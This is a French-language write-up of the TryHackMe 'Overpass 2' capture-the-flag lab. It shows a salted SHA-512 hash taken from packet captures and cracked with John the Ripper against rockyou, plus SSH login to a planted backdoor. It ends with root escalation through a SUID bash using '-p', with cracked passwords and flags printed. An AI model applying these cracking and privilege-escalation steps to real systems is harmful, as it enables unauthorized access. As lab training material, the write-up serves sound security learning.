---
tags: [cyber, forensics, security, tryhackme, wireshark]
title: TryHackMe - Overpass 2
created: '2020-08-18T20:37:17.830Z'
modified: '2020-08-18T20:59:34.154Z'
---

# TryHackMe - Overpass 2

```sh
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
```


Le code du backdoor se trouve : https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go

Il contient un salt : `1c362db832f3f864c8c2fe05f2002a05`
Dans les traces pcap, on a le hash : `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

Pour le craquer on utilise john. Dans un premier temps il faut penser à mettre en forme le hash et le salt ensemble dans un fichier tel que `hash$password`. On utilise alors le format `dynamic=sha512($p.$s)`. 

```sh
kali@kali:~/Documents$ sudo john --crack-status hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=sha512($p.$s) [256/256 AVX2 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
november16       (?)
1g 0:00:00:00 DONE (2020-08-18 16:24) 100.0g/s 2016Kp/s 2016Kc/s 2016KC/s yasmeen..spongy
Use the "--show --format=dynamic=sha512($p.$s)" options to display all of the cracked passwords reliably
Session completed
```


On se connecte au backdoor avec le mdp `november16` que l'on a craqué précédemment :

```sh
kali@kali:~/Documents$ ssh 10.10.197.80 -p 2222
kali@10.10.197.80's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

```sh
james@overpass-production:/home/james$ cat user.txt 
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

```sh
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22 03:40 .
drwxr-xr-x 7 root  root     4096 Jul 21 18:08 ..
lrwxrwxrwx 1 james james       9 Jul 21 18:14 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21 00:36 .cache
drwx------ 3 james james    4096 Aug 18 20:47 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22 03:35 .local
-rw------- 1 james james      51 Jul 21 17:45 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21 00:37 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22 02:57 .suid_bash
drwxrwxr-x 3 james james    4096 Aug 18 20:49 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22 03:40 user.txt
drwxrwxr-x 7 james james    4096 Jul 21 01:37 www
```

Il y a un fichier étrange `.suid_bash` appartenant à `root`, et exécutable par tout le monde. Dans https://gtfobins.github.io/gtfobins/bash/#suid, on apprend que rajouter `-p` après un `bash` suid donne l'accès root sans avoir à sudo :

```sh
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# cat /root/root.txt
thm{d53b2684f169360bb9606c333873144d}
```
